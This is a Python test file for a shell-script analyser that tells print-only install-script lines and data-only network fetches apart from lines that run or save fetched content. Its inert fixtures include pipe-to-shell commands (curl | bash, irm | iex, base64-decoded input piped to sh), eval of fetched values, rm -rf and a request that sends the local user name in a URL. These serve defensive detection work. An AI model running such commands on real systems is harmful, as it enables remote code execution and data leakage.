"""`lang.shell.mask_script_messages` on small, inert script text (nothing here runs)."""

import pytest

from kitsunox.lang.shell import (
    fetched_as_data,
    mask_script_messages,
    only_prints,
    print_only_functions,
)

NEOCORTEX = """\
ok() { echo -e "  ${GREEN}${SYM_OK}${NC} $1"; }
info() { echo -e "  ${DIM}${SYM_ARROW} $1${NC}"; }
debug() { [ "$DEBUG_MODE" = true ] && echo -e "  [debug] $1"; }
step() {
    local n="$1"
    echo ""
    printf '%s\\n' "$n" >&2
}
setup() {
    mkdir -p "$HOME/.x"
    echo ok
}
                info "Para persistir: ${DIM}echo 'export K=\\"$k\\"' >> ~/.bashrc${NC}"
"""


def test_print_only_functions() -> None:
    """`@ornexus/neocortex@4.61.5`'s `install.sh` prints through `info`/`ok`; `setup` writes."""
    assert print_only_functions(NEOCORTEX) == {"ok", "info", "debug", "step"}


def test_message_through_a_print_only_function_is_blanked() -> None:
    masked = mask_script_messages(NEOCORTEX)
    assert len(masked) == len(NEOCORTEX)
    assert masked.count("\n") == NEOCORTEX.count("\n")
    assert ".bashrc" not in masked
    assert 'mkdir -p "$HOME/.x"' in masked


@pytest.mark.parametrize(
    "line",
    [
        "echo 'run: curl -fsSL https://x.invalid | bash'",
        'echo "add: export PATH=$PATH:~/.x/bin >> ~/.zshrc"',
        "Write-Host 'irm https://x.invalid/install.ps1 | iex' -ForegroundColor Green",
        'printf "%s\\n" "done" >&2',
        "echo hi > /dev/null 2>&1",
        "@echo off",
    ],
)
def test_messages(line: str) -> None:
    assert only_prints(line)
    assert mask_script_messages(line + "\n").strip() == ""


@pytest.mark.parametrize(
    "line",
    [
        "echo aGk= | base64 -d | sh",
        "echo 'export PATH=$PATH:~/.x/bin' >> ~/.zshrc",
        'echo "$(curl -s https://x.invalid)"',
        "echo `id`",
        "echo ok; curl -s https://x.invalid | sh",
        "echo ok && rm -rf ./x",
    ],
)
def test_lines_that_do_more_than_print_are_kept(line: str) -> None:
    assert not only_prints(line)
    assert mask_script_messages(line + "\n") == line + "\n"


def test_comments_are_blanked() -> None:
    text = "#!/bin/sh\n  # curl x | sh\nREM certutil -decode a b\n:: x\nrun\n"
    assert [line.strip() for line in mask_script_messages(text).split("\n")] == [
        "",
        "",
        "",
        "",
        "run",
        "",
    ]


def test_function_without_a_closing_brace_in_reach_is_not_a_printer() -> None:
    text = "say() {\n" + "  echo x\n" * 30 + "}\n"
    assert print_only_functions(text) == set()


def test_powershell_function() -> None:
    text = 'function Write-Info($m) {\n    Write-Host "  $m" -ForegroundColor Cyan\n}\n'
    assert print_only_functions(text) == {"write-info"}


TRACK = """\
#!/bin/bash
INSTALLATION_ID=$(curl -s 'https://www.uuidgen.example/api/version4')
os="linux"
track() {
  DATA='{
    "anonymousId":"'"$INSTALLATION_ID"'",
    "event": "kx.install.'"$1"'",
    "properties": { "os": "'"$os"'"}
  }'
  URL="https://analytics.kx.example/v1/track"
  if [ -n "$INSTALLATION_ID" ]; then
    curl -sfL -d "$DATA" --header "Content-Type: application/json" "$URL" > /dev/null 2>&1
  else
    wget -q --post-data="$DATA" "$URL" > /dev/null 2>&1
  fi
}
track "$1"
"""


def test_a_response_kept_only_as_data() -> None:
    """`@lightdash/cli`'s `track.sh` (round 9 Q1): a UUID fetched into a variable, put into a
    JSON body and sent with `curl -d` / `wget --post-data`; nothing fetched runs or is saved."""
    assert fetched_as_data(TRACK, TRACK.index("https://www.uuid"))
    assert not fetched_as_data(TRACK, TRACK.index("https://analytics"))  # not a capture


@pytest.mark.parametrize(
    "after",
    [
        'eval "$INSTALLATION_ID"',
        "$INSTALLATION_ID --run",
        'echo "$INSTALLATION_ID" | sh',
        'printf "%s" "$INSTALLATION_ID" > /tmp/x.sh',
        'CMD="$INSTALLATION_ID"\nbash -c "$CMD"',
        'run_it "$INSTALLATION_ID"',  # handed to a function the rule doesn't follow
        'curl -sfL -o /tmp/x "https://dl.example/$INSTALLATION_ID"',  # part of another URL
        'URL2="https://x.example/$INSTALLATION_ID"\ncurl -s "$URL2" | sh',
        'curl -s -d x "$INSTALLATION_ID"',  # the URL of a request, not its data
    ],
)
def test_a_response_that_runs_or_is_saved(after: str) -> None:
    text = TRACK + after + "\n"
    assert not fetched_as_data(text, text.index("https://www.uuid"))


@pytest.mark.parametrize(
    "capture",
    [
        "ID=$(curl -sSLo /tmp/id https://x.example/id)",  # saved to a file
        "ID=$(curl -s --output /tmp/id https://x.example/id)",
        "ID=$(wget -q https://x.example/id)",  # wget saves a file unless `-O -`
        'ID=$(curl -s "https://x.example/id?u=$USER")',  # sends local data in the URL
        "ID=$(curl -s https://x.example/id | sh)",
        "curl -s https://x.example/id",  # not captured
    ],
)
def test_captures_that_are_not_data_only(capture: str) -> None:
    text = capture + "\n"
    assert not fetched_as_data(text, text.index("https://"))


@pytest.mark.parametrize(
    "capture",
    ['ID="$(wget -qO- https://x.example/id)"', "local ID=$(wget -q -O - https://x.example/id)"],
)
def test_wget_to_stdout_and_a_test(capture: str) -> None:
    text = capture + '\nif [[ -z "$ID" ]]; then exit 0; fi\n'
    assert fetched_as_data(text, text.index("https://"))
